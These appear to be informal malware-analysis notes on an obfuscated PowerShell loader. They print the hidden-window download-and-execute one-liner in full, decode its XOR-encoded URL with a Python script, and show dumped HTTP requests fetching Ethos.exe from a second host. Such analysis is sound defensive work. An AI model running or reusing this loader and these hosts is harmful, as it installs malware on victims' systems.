```powershell
powershell -w h -c $k=15;$h='677b7b7f7c352020686e7b6a7f6e7c7c226c607d7f216c6062207a6a796066786362796563676c7e696e7f78';$u='';for($i=0;$i -lt $h.Length;$i+=2){$u+=[char]([Convert]::ToByte($h.Substring($i,2),16)-bxor$k)};iex(irm $u)
```
![[Pasted image 20260210140208.png]]
![[Pasted image 20260210140219.png]]

```python

c = "677b7b7f7c352020686e7b6a7f6e7c7c226c607d7f216c6062207a6a796066786362796563676c7e696e7f78"

key = 15 # as the XOR used in the payload $k-15

def decrypt_payload(hex_str, xor_key):

    decoded_chars = []

    #process ths string two characters at a time 9sicne each hex byte is 2 chars)

    for i in range(0, len(hex_str), 2):
        # get the hex pair
        hex_byte = hex_str[i:i+2]

        #convert hex to a decimal int
        decimal_val = int(hex_byte, 16)

        #perform the XOR op
        decrypted_val = decimal_val ^ xor_key

        #convert the resulting number back to a character
        decoded_chars.append(chr(decrypted_val))

    return "".join(decoded_chars)

  

result = decrypt_payload(c, key)
print(f"Decoded: {result}")
```

So basically I observe the string and noticed that it is just a hex string and does the XOR operation with key of 15 to get something up and then wrote this simple script to decode it, now of course this could be written in a single line but in case if I ever want to write an article about this, here we are.

So the decoded string was: https://gatepass-corp.com/uevoiwlmvjlhcqfapw
I ran the payload myself and did a powershell dump before stopping it and it revealed that when sesarching for keywords like "gatepass" through the strings of the dump:

```http
GET /wp-includes/tmp/Ethos.exe HTTP/1.1
Host: cronicasdelcentro.com
Connection: Keep-Alive
indowsPowerShell/5.1.19041.6328
Host: gatepass-corp.com
Connection: Keep-Alive
! av
Let's Encrypt1
260125032758Z
260425032757Z0
gatepass-corp.com0Y0
```
It looks like that the script is actually downloading some file called Ethos.exe probably the full formed malware (virus or something) and further into the strings dump it seems to save it into multiple places within the AppData/Local/Temp folder...  but then I got sleepy..... and didn't really dug any deeper.